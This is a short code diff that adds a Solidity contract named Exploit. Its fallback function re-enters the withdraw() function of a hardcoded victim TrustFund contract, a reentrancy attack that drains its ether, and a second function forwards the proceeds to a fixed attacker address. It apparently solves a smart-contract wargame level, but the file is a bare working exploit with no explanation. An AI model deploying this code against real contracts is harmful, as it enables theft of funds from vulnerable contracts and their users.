@@ -1,0 +1,19 @@
+pragma solidity ^0.4.24;
+
+import "./Trustfund1.sol";
+
+contract Exploit {
+    //checksummed address of victim contract
+    address public victim = 0xeaD1D5E463B801E764dEE932a89d3A0DA3e2614F;
+    
+    //fallback function for reentrancy attack
+    function()external payable{
+        TrustFund(victim).withdraw();
+    }
+    
+    //get back the ether
+    function withdraw()external payable  {
+        require(msg.sender == 0x173828e45c574057A1B3E60bf880e0c000eb305B);
+        require(msg.sender.send(1000000000000000000));
+    }
+}
